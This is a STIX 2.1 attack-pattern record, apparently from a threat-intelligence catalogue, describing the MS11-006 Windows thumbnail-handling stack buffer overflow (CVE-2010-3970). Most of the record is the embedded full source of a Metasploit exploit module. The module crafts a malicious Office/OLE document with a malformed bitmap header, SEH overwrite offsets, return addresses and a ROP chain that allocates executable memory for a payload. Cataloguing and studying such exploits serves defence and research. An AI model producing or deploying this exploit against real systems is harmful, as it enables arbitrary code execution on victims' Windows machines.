{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d664258c-000b-44d5-a615-07a11d7ec378",
    "created": "2024-08-14T16:37:02.607221Z",
    "modified": "2024-08-14T16:37:02.607225Z",
    "name": "MS11-006 Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in the handling of thumbnails within .MIC files and various Office documents. When processing a thumbnail bitmap containing a negative 'biClrUsed' value, a stack-based buffer overflow occurs. This leads to arbitrary code execution.  In order to trigger the vulnerable code, the folder containing the document must be viewed using the \"Thumbnails\" view.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ms11_006_createsizeddibsection.rb",
            "external_id": "ms11_006_createsizeddibsection.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3970"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/ole'\nrequire 'rex/ole/util'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS11-006 Microsoft Windows CreateSizedDIBSECTION Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in the handling of thumbnails\n        within .MIC files and various Office documents. When processing a thumbnail bitmap\n        containing a negative 'biClrUsed' value, a stack-based buffer overflow occurs. This\n        leads to arbitrary code execution.\n\n        In order to trigger the vulnerable code, the folder containing the document must be\n        viewed using the \"Thumbnails\" view.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Moti & Xu Hao',  # original discovery\n          'Yaniv Miron aka Lament of ilhack',\n          'jduck'           # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3970' ],\n          [ 'OSVDB', '70263' ],\n          [ 'MSB', 'MS11-006' ],\n          [ 'BID', '45662' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space'         => 512,\n          'BadChars'      => \"\\x00\",\n          'DisableNops'   => true # no need\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # This automatic target will combine all targets into one file :)\n          [ 'Automatic', { } ],\n\n          # Windows 2000 is a soft target... You're not still using it are you?\n          [ 'Windows 2000 SP0/SP4 English',\n            {\n              'Offset' => 1548,   # Offset to SEH frame\n              'Ret' => 0x75022ac4 # p/p/r ws2help.dll v5.0.2134.1\n            }\n          ],\n\n          # My test machine didn't have l3codeca.acm loaded (as mentioned in their slides)\n          # However, it did have msacm32.drv\n          [ 'Windows XP SP3 English',\n            {\n              'Offset' => 1560,    # Offset to SEH frame\n              # Address from msacm32.drv v5.1.2600.0\n              'Ret' => 0x72d11676,  # push esi / mov esi,[esp+0xc] / push [esi+0x54] / call [esi+0x5c]\n\n              # This ends up becoming eip due to above SafeSEH bypass\n              'PivotOffset' => 1652,\n              'RopStart' => 592\n            }\n          ],\n\n=begin\n          [ 'Windows Server 2003 SP2',\n            {\n              'Offset' => 1576,    # Offset to SEH frame\n              'Ret' => 0xfeedfed5\n\n              # rop is possible with l3codeca.acm, but its not clear how to force it to be loaded.\n              # Also, it changed in Feburary 2010 ...\n            }\n          ],\n=end\n\n          # crash on a deref path to heaven.\n          [ 'Crash Target for Debugging',\n            {\n              'Offset' => 1337,\n              'Ret' => 0xdac0ffee\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2010-12-15'))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.doc'])\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    fname = datastore['FILENAME']\n    ltype = \"exploit.fileformat.ms11_006\"\n    out = store_local(ltype, nil, '', fname)\n\n    stg = Rex::OLE::Storage.new(out, Rex::OLE::STGM_WRITE)\n    if (not stg)\n      fail_with(Failure::BadConfig, 'Unable to create output file')\n    end\n\n    stm = stg.create_stream(\"\\x05SummaryInformation\")\n    if (not stm)\n      fail_with(Failure::BadConfig, 'Unable to create SummaryInformation stream')\n    end\n    stm << generate_summaryinfo()\n    stm.close\n\n    stg.close\n\n    print_good(\"#{datastore['FILENAME']} created at #{out}\")\n\n  end\n\n  def generate_summaryinfo\n    si = Rex::OLE::PropertySetStream.new\n\n    ps = Rex::OLE::PropertySet.new(Rex::OLE::FMTID_SummaryInformation)\n\n    bihdr = [\n      0x08,  # ??\n      0x28,  # biSize (struct size)\n      0x50,  # biWidth\n      0x58,  # biHeight\n      0x01,  # biPlanes\n      0x08,  # biBitCount\n      0x00,  # biCompression\n      0xa8c0,  # biSizeImage\n      0x00,  # biXPelsPerMeter\n      0x00,  # biYPelsPerMeter\n      # biClrUsed\n      0x80000001,\n      0x00   # biClrImportant\n    ].pack('VVVVvvVVVVVV')\n\n    # ClipboardData\n    data = rand_text(8192)\n    data[0, bihdr.length] = bihdr\n    data[48, payload.encoded.length] = payload.encoded\n\n    if target.name == \"Automatic\"\n      targets.each { |t|\n        next if t.name !~ /Windows/i\n\n        add_target(data, t)\n      }\n    else\n      add_target(data, target)\n    end\n\n    prop = Rex::OLE::Property.new(Rex::OLE::PIDSI_THUMBNAIL, Rex::OLE::VT_CF, data)\n    ps << prop\n    si << ps\n\n    si.pack\n  end\n\n  def add_target(data, targ)\n    if targ['PivotOffset'] and targ['RopStart']\n      data[targ['Offset'] + 4, 4] = [targ.ret].pack('V')\n\n      rvas = rvas_explorer_xpsp3()\n      rop = generate_rop(rvas)\n\n      pivot = rva2addr(rvas, 'add ebp, [edx+6] / pop eax / leave / ret 4')\n      data[targ['PivotOffset'], 4] = [pivot].pack('V')\n\n      data[targ['RopStart'], rop.length] = rop\n    else\n      seh = generate_seh_record(targ.ret)\n      distance = targ['Offset'] + seh.length\n      distance -= 48  # the entire source buffer isn't copied\n      seh << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n      data[targ['Offset'], seh.length] = seh\n    end\n  end\n\n  def rvas_explorer_xpsp3()\n    # explorer.exe version v6.0.2900.5512\n    # Just return this hash\n    {\n      'add ebp, [edx+6] / pop eax / leave / ret 4' => 0x2be9c,\n      'ret'                    => 0x3ebd,\n\n      'int3 / ... / ret'       => 0x1922f,\n\n      'mov eax, esi / pop edi / pop esi / ret' => 0x2648,\n      'pop ebp / ret'          => 0x3ebc,\n      'add eax, ebp / ret'     => 0x13124,\n      'mov eax, [eax] / ret'   => 0x74b7,\n\n      'pop ebx / ret'          => 0x4bd5,\n      'push eax / call ebx'    => 0xedc7,\n      'pop edi / pop esi / ret' => 0x23bb,\n\n      'pop ecx / ret'          => 0x1acd9,\n      'call [ecx] / pop ebp / ret 0x10' => 0x2ad52,\n\n      'pop edi / ret'          => 0x319bc,\n\n      'lea edi, [eax+0x1c] / rep movsd / pop edi / pop esi / ret' => 0x88c4,\n\n      'mov [eax], ecx / pop ebp / ret 4' => 0xa747,\n      'jmp eax'                => 0x2080\n    }\n  end\n\n  def generate_rop(rvas)\n    # ROP fun! (XP SP3 English, Dec 29 2010)\n    rvas.merge!({\n      # Instructions / Name    => RVA\n      'BaseAddress'            => 0x01000000,\n      'imp_VirtualAlloc'       => 0x11e8,\n      'Scratch'                => 0x46060\n    })\n\n    rop_stack = [\n      'ret',\n      :unused,  # from pivot\n\n      # First, get the address of our source buffer in relation to the\n      # SEH record pointer now saved in ESI\n      'mov eax, esi / pop edi / pop esi / ret',\n      :unused,\n      :unused,\n\n      'pop ebp / ret',\n      0xfffffa18,\n      'add eax, ebp / ret',\n\n      'pop ebx / ret',\n      'pop edi / pop esi / ret',\n      'push eax / call ebx',\n\n      # Allocate an RWX memory segment\n      'pop ecx / ret',\n      'imp_VirtualAlloc',\n\n      'call [ecx] / pop ebp / ret 0x10',\n      0,         # lpAddress\n      0x1000,    # dwSize\n      0x3000,    # flAllocationType\n      0x40,      # flProt\n      :unused,\n\n      # Copy the original payload\n      'pop ecx / ret',\n      :unused,\n      :unused,\n      :unused,\n      :unused,\n      0x80,      # dwords to copy\n\n      'lea edi, [eax+0x1c] / rep movsd / pop edi / pop esi / ret',\n      :unused,\n      :unused,\n\n      # Add a jump over the space/crap\n      'pop ecx / ret',\n      0x90901aeb,\n\n      'mov [eax], ecx / pop ebp / ret 4',\n      :unused,\n\n      'jmp eax'\n    ]\n\n    rop_stack.map! { |e|\n      if e.kind_of? String\n        # Meta-replace (RVA)\n        fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{e}\\\"\") if not rvas[e]\n        rvas['BaseAddress'] + rvas[e]\n\n      elsif e == :unused\n        # Randomize\n        rand_text(4).unpack('V').first\n\n      else\n        # Literal\n        e\n      end\n    }\n\n    rop_stack.pack('V*')\n  end\n\n  def rva2addr(rvas, key)\n    fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{key}\\\"\") if not rvas[key]\n    rvas['BaseAddress'] + rvas[key]\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-12-15",
    "x_mitre_platforms": [
        "win'"
    ]
}